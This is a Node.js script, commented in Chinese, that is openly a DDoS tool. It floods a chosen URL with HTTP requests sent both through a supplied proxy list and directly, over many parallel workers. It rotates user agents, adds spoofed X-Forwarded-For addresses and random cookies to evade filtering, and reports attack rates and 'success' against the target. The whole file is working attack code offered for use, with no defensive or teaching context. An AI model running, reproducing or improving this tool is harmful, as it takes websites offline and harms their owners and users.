'use strict';

// ---------- 自动安装依赖 ----------
const { execSync } = require('child_process');
let colors;
try {
  colors = require('colors');
} catch (err) {
  console.log('\x1b[36m[安装]\x1b[37m 正在安装依赖...'.yellow);
  try {
    execSync('npm install colors', { stdio: 'inherit' });
    console.log('✅ \x1b[32m依赖安装完成，继续执行\x1b[37m'.green);
    // 重新加载模块
    colors = require('colors');
  } catch (e) {
    console.log('⚠️  \x1b[33m安装colors失败，使用基础颜色输出\x1b[37m'.yellow);
    // 创建一个简单的颜色替代对象
    colors = {
      yellow: (str) => `\x1b[33m${str}\x1b[37m`,
      red: (str) => `\x1b[31m${str}\x1b[37m`,
      green: (str) => `\x1b[32m${str}\x1b[37m`,
      cyan: (str) => `\x1b[36m${str}\x1b[37m`,
      magenta: (str) => `\x1b[35m${str}\x1b[37m`,
      blue: (str) => `\x1b[34m${str}\x1b[37m`,
    };
  }
}

// ---------- 设置颜色主题 ----------
if (colors.setTheme) {
  colors.setTheme({
    info: 'cyan',
    warn: 'yellow',
    error: 'red',
    success: 'green',
    attack: 'magenta',
    stats: 'blue'
  });
}

// ---------- 错误处理 ----------
process.on('uncaughtException', function(err) {
  console.error(`[${new Date().toISOString()}] \x1b[31m未捕获异常:\x1b[37m`, err.message);
});

process.on('unhandledRejection', function(reason, promise) {
  console.error(`[${new Date().toISOString()}] \x1b[31m未处理的Promise拒绝:\x1b[37m`, reason);
});

// ---------- 引入模块 ----------
const net = require('net');
const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ---------- 常量定义 ----------
const fileName = path.basename(__filename);
const UAs = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
];

// ---------- 主程序 ----------
function main() {
  // 检查是否从命令行调用且有参数
  const isCLI = require.main === module;
  const hasArgs = process.argv.length > 2;
  
  // 如果没有参数且是命令行调用，显示用法
  if (isCLI && !hasArgs) {
    console.log('\n\x1b[31m[错误]\x1b[37m 参数不足'.error);
    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> <代理文件> <持续时间> <线程数> <方法>'.info);
    console.log('\x1b[33m[示例]\x1b[37m node ' + fileName + ' http://example.com proxies.txt 60 100 GET'.warn);
    console.log('\x1b[33m[注意]\x1b[37m 代理文件格式: 每行一个代理 (ip:端口)'.warn);
    process.exit(1);
  }
  
  // 如果有参数，开始执行
  if (hasArgs) {
    startAttack();
  }
}

// ---------- 启动攻击 ----------
function startAttack() {
  const target = process.argv[2];
  const proxyFile = process.argv[3];
  const duration = parseInt(process.argv[4]);
  const threads = parseInt(process.argv[5]);
  const method = process.argv[6] || 'GET';

  // 参数验证
  if (!target || !proxyFile || !duration || !threads) {
    console.log('\x1b[31m[错误]\x1b[37m 所有参数都是必须的'.error);
    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> <代理文件> <持续时间> <线程数> <方法>'.info);
    process.exit(1);
  }

  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    console.log('\x1b[31m[错误]\x1b[37m 目标必须以 http:// 或 https:// 开头'.error);
    process.exit(1);
  }

  if (isNaN(duration) || duration <= 0) {
    console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是正整数'.error);
    process.exit(1);
  }

  if (isNaN(threads) || threads <= 0) {
    console.log('\x1b[31m[错误]\x1b[37m 线程数必须是正整数'.error);
    process.exit(1);
  }

  // 解析目标URL
  let parsed;
  try {
    parsed = new URL(target);
  } catch (err) {
    console.log('\x1b[31m[错误]\x1b[37m 无效的URL: ' + err.message.error);
    process.exit(1);
  }

  // 加载代理
  let proxies = [];
  try {
    const proxyContent = fs.readFileSync(proxyFile, 'utf-8');
    proxies = proxyContent
      .replace(/\r/g, '')
      .split('\n')
      .filter(line => line.trim() !== '')
      .map(line => {
        const parts = line.trim().split(':');
        return {
          host: parts[0],
          port: parseInt(parts[1]) || 80
        };
      });
    
    if (proxies.length === 0) {
      console.log('\x1b[31m[错误]\x1b[37m 代理文件为空'.error);
      process.exit(1);
    }
    
    console.log(`\x1b[36m[加载]\x1b[37m 成功加载 ${proxies.length} 个代理`.info);
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log('\x1b[31m[错误]\x1b[37m 代理文件不存在: ' + proxyFile.error);
    } else {
      console.log('\x1b[31m[错误]\x1b[37m 读取代理文件失败: ' + err.message.error);
    }
    process.exit(1);
  }

  // 显示攻击信息
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║                     DDoS 攻击启动                           ║
╚══════════════════════════════════════════════════════════════╝`.attack);

  console.log(`\x1b[36m[目标]\x1b[37m     ${target}`.info);
  console.log(`\x1b[36m[主机]\x1b[37m     ${parsed.hostname}:${parsed.port || (parsed.protocol === 'https:' ? 443 : 80)}`.info);
  console.log(`\x1b[36m[协议]\x1b[37m     ${parsed.protocol.replace(':', '')}`.info);
  console.log(`\x1b[36m[方法]\x1b[37m     ${method}`.info);
  console.log(`\x1b[36m[时间]\x1b[37m     ${duration} 秒`.info);
  console.log(`\x1b[36m[线程]\x1b[37m     ${threads} 个`.info);
  console.log(`\x1b[36m[代理]\x1b[37m     ${proxies.length} 个`.info);
  console.log('');

  // 设置攻击结束时间
  const endTime = Date.now() + (duration * 1000);
  setTimeout(() => {
    console.log('\n\x1b[33m[完成] 攻击时间结束，正在关闭...\x1b[37m'.warn);
    process.exit(0);
  }, duration * 1000);

  // 攻击统计
  let totalRequests = 0;
  let failedRequests = 0;
  let startTime = Date.now();

  // 创建多个攻击线程
  for (let i = 0; i < threads; i++) {
    setTimeout(() => {
      attackWorker(i + 1, target, parsed, method, proxies, endTime, (sent, failed) => {
        totalRequests += sent;
        failedRequests += failed;
      });
    }, Math.random() * 1000); // 随机延迟启动
  }

  // 显示实时统计
  console.log('\x1b[33m[启动] 攻击开始，按 Ctrl+C 停止\x1b[37m\n'.warn);
  
  let lastTotal = 0;
  const statsInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const currentRate = Math.round((totalRequests - lastTotal) / 1);
    const avgRate = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
    lastTotal = totalRequests;
    
    const progress = ((Date.now() - (endTime - duration * 1000)) / (duration * 1000) * 100).toFixed(1);
    
    console.log('\x1b[36m[统计]\x1b[37m'.info + 
      ` 请求: ${totalRequests} | 失败: ${failedRequests} | 当前: ${currentRate}/s | 平均: ${avgRate}/s | 进度: ${progress}%`.stats);
    
    // 检查攻击是否结束
    if (Date.now() >= endTime) {
      clearInterval(statsInterval);
      showFinalStats(totalRequests, failedRequests, startTime);
    }
  }, 1000);

  // 处理退出信号
  process.on('SIGINT', () => {
    console.log('\n\x1b[33m[停止] 收到停止信号，正在终止攻击...\x1b[37m'.warn);
    clearInterval(statsInterval);
    showFinalStats(totalRequests, failedRequests, startTime);
    process.exit(0);
  });
}

// ---------- 攻击工作线程 ----------
function attackWorker(id, target, parsed, method, proxies, endTime, callback) {
  let workerRequests = 0;
  let workerFailed = 0;
  const host = parsed.hostname;
  const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
  const isHttps = parsed.protocol === 'https:';
  const path = parsed.pathname + parsed.search;
  
  // 每个线程的请求间隔
  const interval = 10; // 毫秒
  
  const attackInterval = setInterval(() => {
    if (Date.now() >= endTime) {
      clearInterval(attackInterval);
      callback(workerRequests, workerFailed);
      return;
    }
    
    // 随机选择代理
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    
    // 构建HTTP请求
    const requestHeaders = [
      `${method} ${target} HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${UAs[Math.floor(Math.random() * UAs.length)]}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8`,
      `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8`,
      `Accept-Encoding: gzip, deflate`,
      `Cache-Control: no-cache`,
      `Pragma: no-cache`,
      `Connection: keep-alive`,
      `Upgrade-Insecure-Requests: 1`,
    ];
    
    // 随机添加一些头部
    if (Math.random() > 0.5) {
      requestHeaders.push(`X-Forwarded-For: ${generateRandomIP()}`);
    }
    if (Math.random() > 0.7) {
      requestHeaders.push(`Referer: https://www.google.com/`);
    }
    if (Math.random() > 0.8) {
      requestHeaders.push(`Cookie: session=${crypto.randomBytes(16).toString('hex')}`);
    }
    
    const request = requestHeaders.join('\r\n') + '\r\n\r\n';
    
    // 通过代理发送请求
    sendThroughProxy(proxy.host, proxy.port, request, (success) => {
      if (success) {
        workerRequests++;
      } else {
        workerFailed++;
      }
    });
    
  }, interval);
  
  // 也通过直接连接发送（增加攻击压力）
  const directInterval = setInterval(() => {
    if (Date.now() >= endTime) {
      clearInterval(directInterval);
      return;
    }
    
    sendDirectRequest(isHttps, host, port, path, method, (success) => {
      if (success) {
        workerRequests++;
      } else {
        workerFailed++;
      }
    });
    
  }, interval * 2);
}

// ---------- 通过代理发送 ----------
function sendThroughProxy(proxyHost, proxyPort, request, callback) {
  const socket = new net.Socket();
  socket.setTimeout(5000);
  
  socket.once('connect', () => {
    // 每个连接发送多个请求
    for (let i = 0; i < 10; i++) {
      socket.write(request);
    }
    socket.write(request);
    callback(true);
  });
  
  socket.once('error', (err) => {
    callback(false);
  });
  
  socket.once('timeout', () => {
    socket.destroy();
    callback(false);
  });
  
  socket.on('data', (data) => {
    // 收到响应，继续保持连接
    setTimeout(() => {
      socket.destroy();
    }, 3000);
  });
  
  socket.on('close', () => {
    // 连接关闭
  });
  
  try {
    socket.connect(proxyPort, proxyHost);
  } catch (err) {
    callback(false);
  }
}

// ---------- 直接发送请求 ----------
function sendDirectRequest(isHttps, host, port, path, method, callback) {
  const options = {
    hostname: host,
    port: port,
    path: path,
    method: method,
    headers: {
      'Host': host,
      'User-Agent': UAs[Math.floor(Math.random() * UAs.length)],
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
    },
    timeout: 5000
  };
  
  const req = (isHttps ? https : http).request(options, (res) => {
    res.on('data', () => {}); // 忽略响应体
    res.on('end', () => {
      callback(true);
    });
  });
  
  req.on('error', (err) => {
    callback(false);
  });
  
  req.on('timeout', () => {
    req.destroy();
    callback(false);
  });
  
  req.end();
}

// ---------- 生成随机IP ----------
function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// ---------- 显示最终统计 ----------
function showFinalStats(totalRequests, failedRequests, startTime) {
  const elapsed = (Date.now() - startTime) / 1000;
  const avgRate = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
  const successRate = totalRequests > 0 ? ((totalRequests - failedRequests) / totalRequests * 100).toFixed(2) : 0;
  
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║                     攻击统计                                ║
╚══════════════════════════════════════════════════════════════╝`.stats);
  
  console.log(`\x1b[36m[总计]\x1b[37m 总请求数: ${totalRequests}`.info);
  console.log(`\x1b[36m[失败]\x1b[37m 失败请求: ${failedRequests}`.info);
  console.log(`\x1b[36m[时间]\x1b[37m 攻击时长: ${elapsed.toFixed(2)} 秒`.info);
  console.log(`\x1b[36m[速率]\x1b[37m 平均速率: ${avgRate} 请求/秒`.info);
  console.log(`\x1b[36m[成功率]\x1b[37m ${successRate}%`.info);
  console.log(`\x1b[36m[带宽]\x1b[37m 约 ${Math.round(avgRate * 1.5 / 1024)} MB/秒`.info);
  
  if (successRate > 90) {
    console.log('\n\x1b[32m✅ 攻击成功！目标可能已受影响\x1b[37m'.success);
  } else if (successRate > 50) {
    console.log('\n\x1b[33m⚠️  攻击部分成功，目标可能承受压力\x1b[37m'.warn);
  } else {
    console.log('\n\x1b[31m❌ 攻击效果不佳，目标可能防御较强\x1b[37m'.error);
  }
}

// ---------- 启动程序 ----------
if (require.main === module) {
  main();
}

// ---------- 模块导出 ----------
module.exports = {
  main,
  startAttack,
  attackWorker,
  sendThroughProxy,
  sendDirectRequest
};
